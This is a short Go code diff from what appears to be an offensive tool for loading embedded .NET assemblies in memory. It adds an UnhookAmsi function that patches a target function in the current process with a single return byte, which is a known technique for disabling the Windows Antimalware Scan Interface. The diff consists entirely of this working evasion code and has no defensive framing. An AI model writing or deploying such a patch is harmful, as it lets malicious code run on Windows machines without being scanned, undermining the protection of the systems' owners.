@@ -8,6 +8,8 @@ import (
 
 	clr "github.com/Ne0nd0g/go-clr"
 	"github.com/audibleblink/dllinquent"
+	"github.com/audibleblink/memutils"
+	"golang.org/x/sys/windows"
 )
 
 //go:embed assemblies/*
@@ -100,6 +102,15 @@ func HasAmsi() (hasAmsi bool, dll dllinquent.Result, err error) {
 
 	if dll != (dllinquent.Result{}) {
 		hasAmsi = true
+	}
+	return
+}
+
+func UnhookAmsi(fnAddr uintptr) (err error) {
+	ret := []byte{0xc3}
+	err = memutils.JuggleWrite(windows.CurrentProcess(), fnAddr, ret)
+	if err != nil {
+		return
 	}
 	return
 }
